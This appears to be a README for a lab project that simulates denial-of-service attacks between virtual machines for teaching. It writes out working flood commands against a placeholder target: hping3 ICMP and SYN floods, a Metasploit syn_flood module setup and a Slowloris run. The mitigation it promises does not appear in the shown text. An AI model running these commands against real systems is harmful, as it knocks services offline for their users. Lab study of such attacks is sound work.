# 🛡️Simulation of DoS (Denial of Service) Attack

This project demonstrates the simulation of various *Denial of Service (DoS) attacks* in a controlled lab environment for *educational and cybersecurity research purposes*.  
The simulation uses *Kali Linux* as the attacker machine and *Windows 10* (and optional Apache Web Server) as the victim system, running inside *VMware Workstation*.

> ⚠ *Disclaimer: This project is for **educational purposes only*.  
> Performing DoS attacks on unauthorized systems is illegal and punishable by law. Always conduct tests in a controlled lab environment with permission.

## 📌 Objectives
- Understand the working of DoS attacks.
- Simulate attacks using tools like:
  - hping3
  - Metasploit
  - Slowloris
  - LOIC
- Analyze the effect of DoS on target systems.
- Implement basic mitigation strategies.

## 🛠 Lab Setup

### *Requirements*
- *Hardware:*
  - PC with at least 8 GB RAM & virtualization support
- *Software:*
  - VMware Workstation / VirtualBox
  - Kali Linux ISO
  - Windows 10 ISO
  - Apache HTTP Server (optional, for web server attack simulation)
- *Tools Used:*
  - hping3
  - msfconsole (Metasploit Framework)
  - slowloris
  - loic

## ⚙ Steps Performed

### *1. Lab Environment Configuration*
- Install VMware and create two VMs:
  - *Attacker VM*: Kali Linux
  - *Target VM*: Windows 10 or Linux with Apache
- Connect both VMs to the same network (Host-only or NAT).

### *2. Attacks Performed*
#### *a. ICMP Flood Attack (hping3)*
```bash
hping3 -1 --flood -V <target-ip>

#TCP SYN Flood (hping3)
hping3 -S -p 80 --flood -V <target-ip>


#Dos with metasploit
msfconsole
use auxiliary/dos/tcp/syn_flood
set RHOST <target-ip>
set RPORT 80
run

#HTTP DoS with Slowloris
perl slowloris.pl -dns <target-ip> -port 80 -timeout 200 -num 1000
